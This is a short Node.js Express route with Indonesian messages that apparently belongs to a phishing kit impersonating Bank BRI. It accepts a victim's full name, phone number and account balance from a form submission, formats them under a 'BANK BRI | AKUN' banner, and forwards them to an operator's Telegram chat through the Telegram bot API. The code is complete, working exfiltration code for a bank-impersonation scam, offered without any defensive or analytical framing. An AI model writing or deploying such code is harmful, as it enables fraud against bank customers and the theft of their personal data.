const express = require("express");
const axios = require("axios");
const router = express.Router();

// Import file telegram.json
const telegramConfig = require("./telegram.json");

router.post("/", async (req, res) => {
    try {
        const { nama, nomor, saldo } = req.body;
        if (!nama || !nomor || !saldo) {
            return res.status(400).json({ error: "Semua field harus diisi!" });
        }

        const telegramId = telegramConfig.telegramId; // Mengambil dari telegram.json
        const botToken = telegramConfig.botToken;     // Mengambil dari telegram.json

        const message = `
────────────────────
BANK BRI | AKUN | \`${nomor}\`
────────────────────
 • Nama Lengkap : \`${nama}\`
 • Nomor Handphone : \`${nomor}\`
 • Jumlah Saldo Sekarang : \`${saldo}\`
────────────────────`;

        // Kirim pesan ke Telegram
        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
        await axios.post(telegramUrl, {
            chat_id: telegramId,
            text: message,
            parse_mode: "Markdown"
        });

        res.json({ success: true, message: "Pesan berhasil dikirim ke Telegram!" });
    } catch (error) {
        console.error("Error:", error);
        res.status(500).json({ error: "Gagal mengirim pesan ke Telegram!" });
    }
});

module.exports = router;
